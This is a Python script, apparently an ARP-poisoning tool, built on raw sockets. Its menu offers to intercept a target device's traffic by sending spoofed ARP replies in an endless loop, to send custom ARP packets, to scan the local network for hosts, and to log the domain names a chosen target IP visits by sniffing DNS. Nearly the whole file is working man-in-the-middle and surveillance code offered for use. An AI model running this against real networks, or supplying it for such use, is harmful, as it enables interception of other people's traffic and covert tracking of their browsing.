import socket
import struct
import threading
import os, sys, time
from termcolor import colored
from uuid import getnode

#network interface wlp2s0

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

ARP_SLEEP_TIME = 2
listening = False

def create_arp_reply_packet(sendermac, senderip, targetmac, targetip):
	eth_header = [
		struct.pack('!6B', *targetmac), # Destination
		struct.pack('!6B', *sendermac), # Source
		struct.pack('!H', 0x0806) # ARP Protocol
	]

	arp = [
		struct.pack('!H', 0x0001), #ETH 
		struct.pack('!H', 0x0800), #IPv4
		struct.pack('!B', 0x06), #HWD size
		struct.pack('!B', 0x04), #PCL size
		struct.pack('!H', 0x0002), # Reply
		struct.pack('!6B', *sendermac),
		struct.pack('!4B', *senderip),
		struct.pack('!6B', *targetmac),
		struct.pack('!4B', *targetip)
	]
	return b''.join(eth_header + arp)

def create_arp_request_packet(sendermac, senderip, targetmac, targetip):
	eth_header = [
		struct.pack('!6B', *targetmac), # Destination
		struct.pack('!6B', *sendermac), # Source
		struct.pack('!H', 0x0806) # ARP Protocol
	]

	arp = [
		struct.pack('!H', 0x0001), #ETH 
		struct.pack('!H', 0x0800), #IPv4
		struct.pack('!B', 0x06), #HWD size
		struct.pack('!B', 0x04), #PCL size
		struct.pack('!H', 0x0001), # Request
		struct.pack('!6B', *sendermac),
		struct.pack('!4B', *senderip),
		struct.pack('!6B', *targetmac),
		struct.pack('!4B', *targetip)
	]

	trailer = [
		struct.pack('!6H', 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000)
	]
	return b''.join(eth_header + arp + trailer)

def convert_ip(ip):
	return list(map(int,ip.split('.')))

def convert_mac(mac):
	int_mac = mac.split(':')
	for i,b in enumerate(int_mac):
		int_mac[i] = int(int_mac[i], 16)
	return int_mac

def unpack_ip(ip):
	unpackedsenderip = list(struct.unpack('!BBBB',ip))
	senderip = '.'.join(list(map(str,unpackedsenderip)))
	return senderip

def unpack_mac(mac):
	unpackedsendermac = list(struct.unpack('!BBBBBB',mac))
	hexmac = list(map(str,list(map(hex,unpackedsendermac))))
	for i,h in enumerate(hexmac):
		hexmac[i] = h[2:]
		if len(hexmac[i]) == 1:
			hexmac[i] = '0'+hexmac[i]
	sendermac = ':'.join(hexmac)
	return sendermac

def format_unpack(data):
	return list(map(hex,data))

def recv_arp_packet():
	data, addr = s.recvfrom(256)
	ethheader = data[0:14]
	arpheader = data[14:42]
	eth = struct.unpack('!6s6s2s',ethheader)
	arp = struct.unpack('!2s2s1s1s2s6s4s6s4s', arpheader)
	if eth[2] == b'\x08\x06':
		if arp != None:
			if arp[4] == b'\x00\x02':
				arpdata = {
					'hardware_type': arp[0],
					'protocol_type': arp[1],
					'hardware_size': arp[2],
					'protocol_size': arp[3],
					'opcode': arp[4],
					'sender_mac': arp[5],
					'sender_ip': arp[6],
					'target_mac': arp[7],
					'target_ip': arp[8]
				}
				return arpdata

def recv_dns_packet():
	data, addr = s.recvfrom(1024)
	ethheader = data[0:14]
	ipv4header = data[14:34]
	udpheader = data[34:42]
	dnsheader = data[42:54]
	domainnames = data[54:]
	eth = struct.unpack('!6s6s2s',ethheader)
	ipv4 = struct.unpack('!1s1s2s2s2s1s1s2s4s4s', ipv4header)
	udp = struct.unpack('!2s2s2s2s', udpheader)
	if eth[2] == b'\x08\x00' and udp[1] == b'\x00\x35': # Checks if IPv4 Protocol and destination port is 53
		dns = struct.unpack('!2s2s2s2s2s2s',dnsheader)
		unpackedname = []
		bytedomainnames = [domainnames[i:i+1] for i in range(len(domainnames))]
		for index,dnsinfo in enumerate(bytedomainnames):
			unp = struct.unpack('!s',dnsinfo)
			if unp == b'\x00':
				if bytedomainnames[index+1] != None:
					if struct.unpack('!s',bytedomainnames[index+1]) == b'\x01':
						break
			unpackedname.append(unp[0])
		unpackedname = unpackedname[1:-5]
		for index,item in enumerate(unpackedname):
			if unpackedname[index][0] < 32:
				unpackedname[index] = b'.'

		dnsdata = {
			'length': struct.unpack('!H',ipv4[2]),
			'domain': b''.join(unpackedname).decode('utf-8'),
			'source_ip': unpack_ip(ipv4[8]),
			'dest_ip': unpack_ip(ipv4[9])
		}
		return dnsdata

def send_packet(sendermac, senderip, targetmac, targetip, arp_type='reply', loop=None):
	if arp_type == 'reply':
		packet = create_arp_reply_packet(convert_mac(sendermac), convert_ip(senderip), convert_mac(targetmac), convert_ip(targetip))
	else:
		packet = create_arp_request_packet(convert_mac(sendermac), convert_ip(senderip), convert_mac(targetmac), convert_ip(targetip))
	if loop == None or loop == '':
		try:
			while True:
				s.send(packet)
				print('Sending packet:',packet)
				time.sleep(ARP_SLEEP_TIME)
		except Exception as e:
			print('Error sending packet:', str(e))
	else:
		try:
			for x in range(1, loop+1):
				s.send(packet)
				print('Sending packet:',packet)
				time.sleep(ARP_SLEEP_TIME)
		except Exception as e:
			print('Error sending packet:',str(e))

def decode_packets(data):
	if data != [] and data != None:
		for arppacket in data:
			senderip = unpack_ip(arppacket['sender_ip'])
			sendermac = unpack_mac(arppacket['sender_mac'])
			print(colored(senderip,'cyan',attrs=['bold']),'\t===>\t', colored(sendermac,'yellow',attrs=['bold']))
	else:
		print('No replies were received.')

def listen_dns_packets(sourceip):
	while True:
		packetdata = recv_dns_packet()
		if packetdata != None:
			if packetdata['source_ip'] == sourceip:
				output = colored(packetdata['source_ip'] + ' visited ','yellow',attrs=['bold'])
				print(output+packetdata['domain'])
			

def listen_network():
	arpdata = []
	while listening:
		packetdata = recv_arp_packet()
		if packetdata != None:
			if not packetdata in arpdata:
				arpdata.append(packetdata)
	print('\nScan complete. Here are the results:\n')
	decode_packets(arpdata)

def send_requests(defaultgateway, senderip, sendermac, hostrange=256):
	baseip = defaultgateway.split('.')[:3]
	baseip = '.'.join(baseip) + '.'
	for i in range(1,hostrange):
		packet = create_arp_request_packet(convert_mac(sendermac), convert_ip(senderip), convert_mac('ff:ff:ff:ff:ff:ff'), convert_ip(baseip+str(i)))
		s.send(packet)
		time.sleep(0.01)

def full_network_scan(defaultgateway, senderip, sendermac, alldata=[]):
	global listening
	t = threading.Thread(target=listen_network)
	# t.daemon = True
	listening = True
	t.start()
	send_requests(defaultgateway, senderip, sendermac)
	listening = False

def load_menu():
	print(colored('''
  ___  ____________  ______     _                 
 / _ \\ | ___ \\ ___ \\ | ___ \\   (_)                
/ /_\\ \\| |_/ / |_/ / | |_/ /__  _ ___  ___  _ __  
|  _  ||    /|  __/  |  __/ _ \\| / __|/ _ \\| '_ \\ 
| | | || |\\ \\| |     | | | (_) | \\__ \\ (_) | | | |
\\_| |_/\\_| \\_\\_|     \\_|  \\___/|_|___/\\___/|_| |_|
                                                  
''','green',attrs=['bold']))
	print('------------------------------------------------------\n')
	try:
		networkinterface = input('Network interface: ')
		s.bind((networkinterface,0))
	except OSError:
		print(colored('\nNetwork interface does not exist!\n\nRestarting...\n\n','red',attrs=['bold']))
		load()

	print('''
[1] Intercept data to another device
[2] Send custom ARP packet
[3] Scan network for devices
[4] Log domain names
[5] Exit

------------------------------------------------------
	''')
	option = input('Option: ')
	if int(option) == 1:
		macaddr = ':'.join(("%012X" % getnode())[i:i+2] for i in range(0, 12, 2))
		defaultgateway = input('\nDefault gateway: ')
		routermac = input('Router MAC: ')
		targetmachine = input('Target IP: ')
		loops = input('Time in seconds (default is infinite): ')
		if loops == '':
			send_packet(macaddr, targetmachine, routermac, defaultgateway)
		else:
			send_packet(macaddr, targetmachine, routermac, defaultgateway, loop=int(loops))
	elif int(option) == 2:
		senderip = input('\nSender IP: ')
		sendermac = input('Sender MAC: ')
		targetip = input('Target IP: ')
		targetmac = input('Target MAC: ')
		loops = input('Time in seconds (default is infinite): ')
		if loops == '':
			send_packet(sendermac, senderip, targetmac, targetip)
		else:
			send_packet(sendermac, senderip, targetmac, targetip, loop=int(loops))
	elif int(option) == 3:
		defaultgateway = input('\nDefault gateway: ')
		senderip = input('Sender IP: ')
		sendermac = input('Sender MAC: ')
		print('\nScanning for devices on network...')
		try:
			full_network_scan(defaultgateway, senderip, sendermac)
		except struct.error:
			print(colored('\n\nMAC Address does not exist!\n\n','red',attrs=['bold']))
			load()
	elif int(option) == 4:
		sourceip = input('\nTarget IP: ')
		print('\nLogging domains visited...\n')
		listen_dns_packets(sourceip)
	else:
		print('\n')
		try:
			sys.exit(0)
		except SystemExit:
			os._exit(0)

def load():
	try:
		load_menu()
	except KeyboardInterrupt:
		check = input('\n\nDo you wish to exit? (y/n): ')
		if check.lower() == 'y':
			s.close()
			try:
				sys.exit(0)
			except SystemExit:
				os._exit(0)
		else:
			load()
			raise


if __name__ == '__main__':
	load()